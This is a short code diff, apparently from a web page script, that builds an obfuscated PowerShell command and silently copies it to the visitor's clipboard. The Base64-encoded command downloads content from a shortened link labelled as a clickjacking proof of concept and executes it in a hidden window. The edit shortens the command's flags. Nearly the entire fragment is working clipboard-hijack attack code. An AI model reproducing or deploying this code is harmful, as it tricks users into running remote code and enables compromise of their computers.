@@ -60,7 +60,7 @@
         const encodedCommand = "SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAJwBoAHQAdABwAHMAOgAvAC8AYgBpAHQALgBsAHkALwBjAGwAaQBjAGsAagBhAGMAawBwAG8AYwAnACkALgBDAG8AbgB0AGUAbgB0ADsA";
 
         // Full PowerShell command
-        const fullCommand = `powershell -NoProfile -WindowStyle Hidden -EncodedCommand ${encodedCommand}`;
+        const fullCommand = `powershell -WindowStyle Hidden -ec ${encodedCommand}`;
 
         // Write the command to the clipboard
         navigator.clipboard.writeText(fullCommand).then(() => {
